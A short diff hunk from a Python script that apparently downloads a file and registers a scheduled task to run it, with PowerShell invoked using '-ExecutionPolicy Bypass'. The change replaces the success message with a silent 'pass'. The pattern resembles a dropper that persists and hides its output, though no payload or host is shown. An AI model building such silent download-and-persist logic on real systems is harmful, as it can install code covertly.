@@ -30,7 +30,9 @@ subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Comm
 
 # Step 2: Create the Scheduled Task to Run Python Directly
 if os.path.exists(script_path):
-    print(f"✅ Successfully downloaded: {script_path}")
+    pass
+else:
+    print("Something went wrong...")
 
 # Corrected schtasks command to run Python directly
 create_task_command = f'''
